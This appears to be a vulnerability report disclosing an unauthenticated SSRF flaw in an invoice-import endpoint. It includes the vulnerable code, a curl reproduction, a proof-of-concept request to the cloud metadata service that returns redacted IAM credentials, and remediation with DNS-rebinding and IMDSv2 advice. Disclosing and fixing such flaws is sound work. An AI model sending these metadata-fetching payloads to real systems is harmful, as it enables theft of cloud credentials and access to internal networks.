# SSRF in invoice import reaches internal hosts and cloud metadata

## Summary

`POST /invoices/import` fetches whatever URL you hand it and returns the body. Point it at `http://169.254.169.254/` and the server reads its own cloud instance metadata — including IAM credentials — and hands them back to you. The server becomes your proxy into the network it trusts.

## Vulnerability details

- **Type / CWE:** Server-side request forgery (CWE-918).
- **Severity:** Critical. `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` = 9.3. Scope is changed because the request crosses into systems the app can reach and the attacker can't.
- **Affected endpoint:** `POST /invoices/import`, JSON field `url`.
- **Authentication:** none.

## Description

The handler takes `url` from the body and fetches it directly:

```ts
const url = req.body?.url;
const upstream = await fetch(url);   // no validation
res.json({ imported: await upstream.json() });
```

There's no allowlist and no block on internal ranges, so `url` can be any address the server can route to: `169.254.169.254` (AWS/GCP metadata), `127.0.0.1` (admin panels, unauthenticated local services), or anything in `10.0.0.0/8` / `192.168.0.0/16`. The response body is echoed back, which turns a blind SSRF into a fully readable one. Worth noting: the codebase already ships an `assertPublicHost` guard. This endpoint just never calls it.

## Steps to reproduce

1. Stand up (or find) a service only the server can reach. For a self-contained demo, run a local listener on `127.0.0.1:9000` that returns a secret.
2. Ask the import endpoint to fetch it:
   ```bash
   curl -X POST 'http://localhost:3000/invoices/import' \
     -H 'Content-Type: application/json' \
     -d '{"url":"http://127.0.0.1:9000/secret"}'
   ```
3. The response contains the internal service's body. On a real cloud host, swap the URL for `http://169.254.169.254/latest/meta-data/iam/security-credentials/`.

## Proof of concept

Request:
```
POST /invoices/import HTTP/1.1
Host: localhost:3000
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/" }
```

Response (on a cloud instance):
```json
{ "imported": { "Code": "Success", "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." } }
```

Those are live, temporary AWS credentials for the instance role, read straight out of the metadata service by the server on my behalf.

## Impact

On a cloud host this is usually a straight line to credential theft: read the instance role's keys from the metadata endpoint, then use them against the account's APIs. Off the metadata path, the same primitive reaches internal admin panels, databases, and other RFC1918 services that assume "if you can reach me you're trusted." Because the response is returned, everything is readable, not just reachable. That combination — unauthenticated, readable, points at metadata — is why this sits at the top of the severity range.

## Remediation

Validate the destination before fetching. Parse the URL, require `http(s)`, resolve the host, and reject loopback, link-local (including `169.254.169.254`), and RFC1918 ranges:

```ts
let safe: string;
try { safe = assertPublicHost(url); }         // the guard already in the repo
catch { return res.status(400).json({ error: 'url host is not permitted' }); }
const upstream = await fetch(safe);
```

Two hardening notes worth carrying: validating the literal host isn't enough on its own (a public name that resolves to a private IP — DNS rebinding — or an HTTP redirect into the internal range still gets through), so re-check the resolved IP and disable or re-validate redirects. And block the metadata IP at the network layer / require IMDSv2 as defense in depth.

## References

- [CWE-918: Server-Side Request Forgery](https://cwe.mitre.org/data/definitions/918.html)
- [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html)
- OWASP Top 10: A10:2021 Server-Side Request Forgery
